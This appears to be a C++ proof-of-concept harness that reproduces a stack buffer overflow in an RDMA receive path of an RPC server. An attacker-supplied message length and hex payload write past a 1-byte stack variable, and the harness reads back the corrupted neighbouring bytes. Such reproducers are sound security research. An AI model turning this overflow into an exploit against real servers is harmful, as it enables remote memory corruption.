// Main/test logic appended after the verbatim rdma_recv slice.
static uint8_t g_tail[128];
static uint8_t g_sink = 0;

static void reset(uint32_t got, const uint8_t * payload) {
    std::memset(&g_wc, 0, sizeof g_wc);
    g_wc.wr_id = 0;
    g_wc.byte_len = got;          // attacker-controlled RDMA message length
    g_wc.status = 0;
    g_conn.rx_buf = g_rxbuf;
    std::memset(g_conn.rx_buf, 0, RDMA_CHUNK);
    std::memcpy(g_conn.rx_buf, payload, got);  // attacker-controlled message bytes
    g_poll_calls = 0;
    g_conn.posted = 0;
    g_impl.rdma.p = &g_conn;
    std::memset(g_tail, 0xC7, sizeof g_tail);
}

#ifdef ASAN_BUILD
// Faithful sink: the single 1-byte stack variable from rpc_serve_client.

static bool serve(uint32_t got, const uint8_t * payload) {
    reset(got, payload);
    uint8_t cmd = 0xA5;
    bool ok = g_impl.rdma_recv(&cmd, 1);
    g_sink = cmd;
    return ok;
}
#else
// Contiguous probe frame exposes the stack bytes adjacent to cmd so the
// chosen-byte landing can be read deterministically in a non-ASan build.
struct probe_frame { uint8_t cmd; uint8_t tail[128]; };
static bool serve(uint32_t got, const uint8_t * payload) {
    reset(got, payload);
    probe_frame f;
    f.cmd = 0xA5;
    std::memset(f.tail, 0xC7, sizeof f.tail);
    bool ok = g_impl.rdma_recv(&f.cmd, 1);
    std::memcpy(g_tail, f.tail, sizeof f.tail);
    return ok;
}
#endif

int main(int argc, char ** argv) {
    if (argc < 3) { std::printf("USAGE driver GOT PAYLOAD_HEX\n"); return 2; }
    uint32_t got = (uint32_t)strtoul(argv[1], nullptr, 10);
    uint8_t payload[RDMA_CHUNK];
    size_t plen = 0;
    const char * hex = argv[2];
    while (hex[0] && hex[1] && plen < sizeof payload) {
        char b[3] = { hex[0], hex[1], 0 };
        payload[plen++] = (uint8_t)strtoul(b, nullptr, 16);
        hex += 2;
    }
    if (got > sizeof payload) return 2;

    bool ok = serve(got, payload);

    std::printf("MODE=%s\n",
#ifdef ASAN_BUILD
        "asan"
#else
        "plain"
#endif
    );
    std::printf("GOT=%u\n", got);
    std::printf("REQUESTED=1\n");
    std::printf("OOB=%lld\n", got > 1 ? (long long)(got - 1) : 0LL);
    std::printf("REM_UNDERFLOW=%llu\n", got > 1 ? (unsigned long long)(1ULL - (unsigned long long)got) : 0ULL);
    std::printf("RC=%d\n", ok ? 1 : 0);
    std::printf("POSTED=%d\n", g_conn.posted);
    std::printf("SINK=%02x\n", g_sink);
    std::printf("TAIL0=%02x\n", g_tail[0]);
    std::printf("TAIL10=%02x\n", g_tail[10]);
    std::printf("TAIL17=%02x\n", g_tail[17]);
    std::printf("TAIL42=%02x\n", g_tail[42]);
    std::printf("TAIL43=%02x\n", g_tail[43]);
    std::printf("TRACE_END\n");
    return 0;
}
